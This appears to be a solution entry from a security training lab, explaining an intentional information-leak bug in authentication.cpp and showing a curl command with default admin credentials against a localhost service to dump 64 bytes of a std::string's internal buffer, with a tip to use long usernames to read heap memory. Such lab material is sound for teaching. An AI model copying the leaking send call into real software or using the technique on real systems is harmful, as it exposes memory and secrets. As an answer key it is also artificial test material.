# Solution — 07 · Username Info Leak

**Code**: `authentication.cpp` → `send(client_socket, leaked_ptr, 64, 0);`

```bash
curl -u admin:admin http://127.0.0.1:8081/whoami | xxd | head
```

The response starts with `Leaked internal username object bytes:` followed
by 64 raw bytes read from the `std::string` internal buffer. Try with
longer usernames (>SSO threshold) to leak past the heap allocation.
